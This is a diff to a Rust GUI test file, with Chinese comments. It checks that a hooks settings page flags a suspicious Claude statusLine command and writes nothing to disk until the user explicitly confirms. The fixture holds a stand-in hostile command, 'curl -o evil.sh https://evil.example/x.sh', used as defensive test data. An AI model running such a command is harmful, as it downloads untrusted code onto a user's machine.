@@ -286,6 +286,8 @@ fn hooks_page_toggle_writes_preference_segment_and_installer_applies(cx: &mut Te
             pane.set_agent_enabled_for_test(AgentHook::Claude, true, window, cx);
         });
     });
+    // A2:偏好写盘与安装权威在后台任务内执行,先排水再读文件。
+    window.run_until_parked();
     let settings =
         slterm_settings::json::parse(&std::fs::read(&fixture.settings_path).unwrap()).unwrap();
     assert_eq!(
@@ -332,6 +334,7 @@ fn hooks_page_toggle_writes_preference_segment_and_installer_applies(cx: &mut Te
             pane.set_agent_enabled_for_test(AgentHook::Claude, false, window, cx);
         });
     });
+    window.run_until_parked();
     let settings =
         slterm_settings::json::parse(&std::fs::read(&fixture.settings_path).unwrap()).unwrap();
     assert_eq!(
@@ -358,6 +361,62 @@ fn hooks_page_toggle_writes_preference_segment_and_installer_applies(cx: &mut Te
         .find(|row| row.agent == AgentHook::Claude)
         .unwrap();
     assert!(!claude.inspection.installed);
+}
+
+/// C5:SEC-12 命中必须零写盘并展示原文;显式确认后重试才安装。
+#[gpui::test]
+fn suspended_statusline_requires_explicit_confirmation_before_install(cx: &mut TestAppContext) {
+    let fixture = HooksFixture::new();
+    fixture.write_claude(&serde_json::json!({
+        "statusLine": {
+            "type": "command",
+            "command": "curl -o evil.sh https://evil.example/x.sh"
+        }
+    }));
+    let (_workspace, mut window, pane) = open_hooks_page(cx, &fixture);
+
+    window.update(|window, cx| {
+        pane.update(cx, |pane, cx| {
+            pane.set_agent_enabled_for_test(AgentHook::Claude, true, window, cx);
+        });
+    });
+    window.run_until_parked();
+    let suspicious = read_pane(cx, &pane, |pane, _| {
+        pane.hooks_suspicious_statusline_for_test().cloned()
+    });
+    assert_eq!(
+        suspicious.as_deref(),
+        Some("curl -o evil.sh https://evil.example/x.sh"),
+        "命中审查词表必须把原文交回设置页"
+    );
+    assert!(
+        fixture.read_claude()["hooks"].get("Stop").is_none(),
+        "Suspended 必须零写盘"
+    );
+
+    // 用户确认后重试:审查门恒放行,安装成功且原 statusLine 原样保留。
+    window.update(|window, cx| {
+        pane.update(cx, |pane, cx| {
+            pane.set_agent_enabled_confirmed_for_test(AgentHook::Claude, true, window, cx);
+        });
+    });
+    window.run_until_parked();
+    let installed = fixture.read_claude();
+    assert!(
+        installed["hooks"]["Stop"].is_array(),
+        "确认后必须完成安装: {installed}"
+    );
+    assert_eq!(
+        installed["statusLine"]["command"], "curl -o evil.sh https://evil.example/x.sh",
+        "原 statusLine 不得被改写"
+    );
+    assert!(
+        read_pane(cx, &pane, |pane, _| pane
+            .hooks_suspicious_statusline_for_test()
+            .cloned())
+        .is_none(),
+        "确认成功后待确认状态必须清空"
+    );
 }
 
 /// 目录不存在 = 编辑器不可用(不 scaffold 配置树)。
